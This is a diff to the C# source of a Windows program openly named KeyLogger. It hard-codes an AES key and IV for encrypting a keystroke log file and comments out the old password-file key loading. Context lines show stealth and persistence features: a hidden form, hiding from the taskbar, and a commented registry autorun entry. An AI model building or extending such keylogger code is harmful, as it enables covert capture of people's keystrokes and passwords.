@@ -16,6 +16,9 @@ namespace KeyLogger
 {
     public partial class Form1 : Form
     {
+        string strkey = "A171AA811A6D353C8BC40F82B689F889";
+        string striv = "C87799A3280FE1BC574DED5BC85D003F";
+
         string file = "Record.txt";
         string pass = "Password.txt";
         string decode = "Decode.txt";
@@ -23,6 +26,7 @@ namespace KeyLogger
         string k = "";
         byte[] key = new byte[16];
         byte[] iv = new byte[16];
+
         //Encrypt
         static byte[] Encrypt(string simpletext, byte[] key, byte[] iv)
         {
@@ -72,6 +76,14 @@ namespace KeyLogger
         {
             InitializeComponent();
             this.KeyPreview = true;
+            for (int i = 0; i < 32; i += 2)
+            {
+                key[i / 2] = Convert.ToByte(strkey.Substring(i, 2), 16);
+            }
+            for (int i = 0; i < 32; i += 2)
+            {
+                iv[i / 2] = Convert.ToByte(striv.Substring(i, 2), 16);
+            }
             //                                 !!!CANH BAO!!!
             //  KHONG NEN CHAY CODE KHONG HIEN THI FORM VA CODE KHONG HIEN THI TREN TASKBAR CUNG LUC
             //  NEU LO CHAY 2 CODE TREN CUNG LUC, VO TASK-MANAGER -> XOA TIEN TRINH DANG CHAY TRONG VISUAL STUDIO, SAU DO VO COMMENT 2 DONG CODE VA BUILD LAI CHUONG TRINH
@@ -91,6 +103,7 @@ namespace KeyLogger
             rk.SetValue(keyName, programPath);*/
 
             //if_else trong public Form1();
+            /*
             if (!File.Exists(pass))
             {
 
@@ -135,9 +148,9 @@ namespace KeyLogger
                 {
                     iv[i / 2] = Convert.ToByte(detached[1].Substring(i, 2), 16);
                 }
-                
-            }
 
+            }
+            */
         }
 
         private void timer1_Tick(object sender, EventArgs e)
